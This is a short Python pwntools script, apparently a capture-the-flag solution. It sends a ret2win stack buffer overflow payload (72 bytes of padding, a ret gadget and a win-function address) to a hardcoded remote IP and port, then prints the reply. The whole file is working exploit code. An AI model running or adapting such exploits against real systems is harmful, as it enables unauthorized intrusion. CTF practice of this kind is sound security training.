from pwn import *

HOST = "165.22.246.161"
PORT = 13401

context.arch = "amd64"
context.log_level = "info"

offset = 72

ret = 0x401274
win = 0x4011f6

payload = b"A" * 72 + p64(ret) + p64(win)

io = remote(HOST, PORT)
io.recvuntil(b"TryHards says: ")
io.sendline(payload)

print(io.recvall(timeout=3).decode(errors="replace"))
io.close()
